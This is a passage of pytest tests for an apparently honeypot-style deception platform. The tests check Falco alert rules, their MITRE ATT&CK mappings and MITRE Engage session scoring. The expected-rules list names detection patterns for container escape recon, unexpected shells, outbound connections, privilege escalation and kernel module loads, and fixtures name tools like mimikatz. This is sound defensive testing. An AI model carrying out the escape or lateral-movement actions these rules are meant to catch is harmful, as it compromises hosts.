    These tests intentionally trigger escape-like behavior
    and verify that corresponding Falco alerts appear in NATS.
    """

    def test_shell_escape_detection(self, staging, ssh_shell):
        """
        If an attacker somehow spawns a real shell (not the
        emulated one), Falco should detect it.

        Note: In the normal SSH decoy, commands are emulated —
        no real shell spawns. This test verifies the Falco rule
        works by checking that the decoy's Python process is
        NOT flagged (it's a known process).
        """
        # Send commands through the emulated shell
        send_command(ssh_shell, "whoami")
        send_command(ssh_shell, "ls /tmp")

        # These should NOT trigger Falco — they're emulated
        # The test passes if no Falco alert appears for
        # the known Python process within 5 seconds
        alerts = []

        async def check_no_false_positives():
            nc = await nats_lib.connect(staging.nats_url)
            sub = await nc.subscribe("cicdecoy.security.falco.>")

            try:
                msg = await asyncio.wait_for(sub.next_msg(), timeout=5)
                alert = json.loads(msg.data.decode())
                # If an alert fires, it should NOT be for our known process
                if "python" not in alert.get("output_fields", {}).get("proc.name", ""):
                    alerts.append(alert)
            except asyncio.TimeoutError:
                pass  # No alert = correct behavior

            await nc.close()

        asyncio.run(check_no_false_positives())
        # No false positive alerts from normal emulated commands
        assert len(alerts) == 0, f"False positive Falco alert: {alerts}"

    def test_container_escape_recon_files_exist_in_rules(self):
        """Verify our Falco rules cover the key escape recon paths."""
        import yaml
        rules_path = "platform/falco/cicdecoy-rules.yaml"
        try:
            with open(rules_path) as f:
                rules = yaml.safe_load_all(f)
                rule_names = []
                for doc in rules:
                    if isinstance(doc, dict) and "rule" in doc:
                        rule_names.append(doc["rule"])
                    elif isinstance(doc, list):
                        for item in doc:
                            if isinstance(item, dict) and "rule" in item:
                                rule_names.append(item["rule"])

            expected_rules = [
                "CICDecoy — Write to kernel interface",
                "CICDecoy — Mount syscall in decoy",
                "CICDecoy — Ptrace from decoy container",
                "CICDecoy — Kernel module load from decoy",
                "CICDecoy — Unexpected shell in decoy",
                "CICDecoy — Unexpected outbound connection from decoy",
                "CICDecoy — Internet connection from decoy",
                "CICDecoy — Container escape recon in decoy",
                "CICDecoy — Privilege escalation in decoy",
                "CICDecoy — Binary execution in decoy",
            ]

            for expected in expected_rules:
                assert expected in rule_names, f"Missing Falco rule: {expected}"

        except FileNotFoundError:
            pytest.skip("Falco rules file not found")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  UNIT TESTS — Falco Correlator
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# tests/unit/test_falco_correlator.py

sys.path.insert(0, "cti")
from falco_correlator import FalcoCorrelator


class TestFalcoCorrelatorPodNameParsing:
    """Test the pod name → decoy name extraction logic."""

    def test_standard_pod_name(self):
        assert FalcoCorrelator._pod_to_decoy_name(
            "decoy-bastion-dmz-01-7f8b9c-x4k2"
        ) == "bastion-dmz-01"

    def test_simple_pod_name(self):
        assert FalcoCorrelator._pod_to_decoy_name(
            "decoy-ssh-beacon-abc123-def456"
        ) == "ssh-beacon"

    def test_non_decoy_pod(self):
        assert FalcoCorrelator._pod_to_decoy_name(
            "nginx-deployment-abc123"
        ) == "nginx-deployment-abc123"

    def test_short_name(self):
        assert FalcoCorrelator._pod_to_decoy_name(
            "decoy-test-ab-cd"
        ) == "test"


class TestFalcoAttackMapping:
    """Test that Falco rules map to correct ATT&CK techniques."""

    def test_escape_rules_map_to_t1611(self):
        escape_rules = [
            "CICDecoy — Write to kernel interface",
            "CICDecoy — Mount syscall in decoy",
            "CICDecoy — Kernel module load from decoy",
        ]
        for rule in escape_rules:
            technique_id, _ = FalcoCorrelator.FALCO_ATTACK_MAP.get(rule, ("", ""))
            assert technique_id == "T1611", f"Rule '{rule}' should map to T1611"

    def test_shell_maps_to_t1059(self):
        technique_id, _ = FalcoCorrelator.FALCO_ATTACK_MAP.get(
            "CICDecoy — Unexpected shell in decoy", ("", "")
        )
        assert technique_id == "T1059.004"

    def test_lateral_maps_to_t1021(self):
        technique_id, _ = FalcoCorrelator.FALCO_ATTACK_MAP.get(
            "CICDecoy — Unexpected outbound connection", ("", "")
        )
        assert technique_id == "T1021"

    def test_all_rules_have_mappings(self):
        """Every Falco rule should have an ATT&CK mapping."""
        for rule in FalcoCorrelator.FALCO_ATTACK_MAP:
            technique_id, name = FalcoCorrelator.FALCO_ATTACK_MAP[rule]
            assert technique_id.startswith("T"), f"Invalid technique ID for {rule}"
            assert len(name) > 0, f"Missing technique name for {rule}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  UNIT TESTS — Engage Mapper
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# tests/unit/test_engage_mapper.py

from engage_mapper import EngageEnricher, EngageCampaignAnalyzer, map_decoy_to_engage


class TestEngageDecoyMapping:
    """Test automatic Engage annotation of decoy specs."""

    def test_tier1_maps_to_lure(self):
        spec = {"fidelity": {"tier": 1}, "authentication": {"mode": "closed"},
                "filesystem": {}}
        result = map_decoy_to_engage(spec)
        assert "EAC0005" in result["activities"]  # Lure
        assert "EGA0005" in result["goals"]        # Detect

    def test_tier3_maps_to_pocket_lure(self):
        spec = {"fidelity": {"tier": 3}, "authentication": {"mode": "realistic"},
                "filesystem": {}}
        result = map_decoy_to_engage(spec)
        assert "EAC0006" in result["activities"]  # Pocket Lure
        assert "EGA0004" in result["goals"]        # Elicit

    def test_honeytoken_overlay_adds_credential_activities(self):
        spec = {
            "fidelity": {"tier": 2},
            "authentication": {"mode": "selective"},
            "filesystem": {
                "overlays": [
                    {"type": "honeytoken", "tokenRefs": ["aws-canary"]}
                ]
            },
        }
        result = map_decoy_to_engage(spec)
        assert "EAC0003" in result["activities"]  # Decoy Credentials
        assert "EAC0008" in result["activities"]  # Credential Monitoring

    def test_open_auth_adds_introduced_vulnerabilities(self):
        spec = {"fidelity": {"tier": 2}, "authentication": {"mode": "open"},
                "filesystem": {}}
        result = map_decoy_to_engage(spec)
        assert "EAC0010" in result["activities"]  # Introduced Vulnerabilities


class TestEngageSessionEnrichment:
    """Test session-level Engage outcome calculation."""

    def setup_method(self):
        self.enricher = EngageEnricher()

    def test_basic_session_achieves_detect(self):
        session = {
            "session_id": "test-001", "decoy_name": "ssh-01",
            "decoy_tier": 2, "duration_seconds": 30,
            "command_count": 5, "mitre_techniques": [],
            "tools_detected": [], "honeytokens_accessed": [],
            "credentials_captured": [{"user": "admin"}],
            "alerts": [],
        }
        outcome = self.enricher.enrich_session(session)
        goal_ids = [g["id"] for g in outcome.goals_achieved]
        assert "EGA0005" in goal_ids  # Detect

    def test_long_session_achieves_elicit(self):
        session = {
            "session_id": "test-002", "decoy_name": "ssh-01",
            "decoy_tier": 3, "duration_seconds": 300,
            "command_count": 25,
            "mitre_techniques": [{"technique_id": f"T100{i}"} for i in range(5)],
            "tools_detected": ["nmap"],
            "honeytokens_accessed": [],
            "credentials_captured": [],
            "alerts": [],
        }
        outcome = self.enricher.enrich_session(session)
        goal_ids = [g["id"] for g in outcome.goals_achieved]
        assert "EGA0004" in goal_ids  # Elicit
        assert "EGA0003" in goal_ids  # Affect (>300s)

    def test_honeytoken_trigger_high_value(self):
        session = {
            "session_id": "test-003", "decoy_name": "ssh-01",
            "decoy_tier": 3, "duration_seconds": 60,
            "command_count": 10,
            "mitre_techniques": [{"technique_id": "T1552.001"}],
            "tools_detected": [],
            "honeytokens_accessed": ["aws-canary"],
            "credentials_captured": [],
            "alerts": [],
        }
        outcome = self.enricher.enrich_session(session)
        assert outcome.honeytokens_triggered == 1
        activity_ids = [a["id"] for a in outcome.activities_exercised]
        assert "EAC0003" in activity_ids  # Decoy Credentials
        assert outcome.intelligence_value in ("high", "critical")

    def test_intelligence_scoring(self):
        session = {
            "session_id": "test-004", "decoy_name": "ssh-01",
            "decoy_tier": 3, "duration_seconds": 600,
            "command_count": 30,
            "mitre_techniques": [{"technique_id": f"T100{i}"} for i in range(8)],
            "tools_detected": ["cobalt_strike", "mimikatz"],
            "honeytokens_accessed": ["aws-canary"],
            "credentials_captured": [{"user": "admin"}],
            "alerts": [],
        }
        outcome = self.enricher.enrich_session(session)
        assert outcome.intelligence_value == "critical"


class TestEngageCampaignAnalysis:
    """Test campaign-level Engage aggregation."""

    def test_empty_campaign(self):
        analyzer = EngageCampaignAnalyzer()
        result = analyzer.analyze_campaign([], "test")
        assert result["sessions"] == 0

    def test_campaign_aggregation(self):
        enricher = EngageEnricher()
        sessions = [
            {
                "session_id": f"s-{i}", "decoy_name": "ssh-01",
                "decoy_tier": 2, "duration_seconds": 60 * (i + 1),
                "command_count": 5 * (i + 1),
                "mitre_techniques": [{"technique_id": "T1082"}],
                "tools_detected": [], "honeytokens_accessed": [],
                "credentials_captured": [], "alerts": [],
            }
            for i in range(5)
        ]
        outcomes = [enricher.enrich_session(s) for s in sessions]
        analyzer = EngageCampaignAnalyzer()
        result = analyzer.analyze_campaign(outcomes, "q1-hunt")

        assert result["summary"]["total_sessions"] == 5
        assert result["summary"]["total_commands_captured"] == 75
        assert result["summary"]["deception_success_rate"] == 100.0
        assert "EGA0005" in result["engage_goals"]  # All sessions achieve Detect
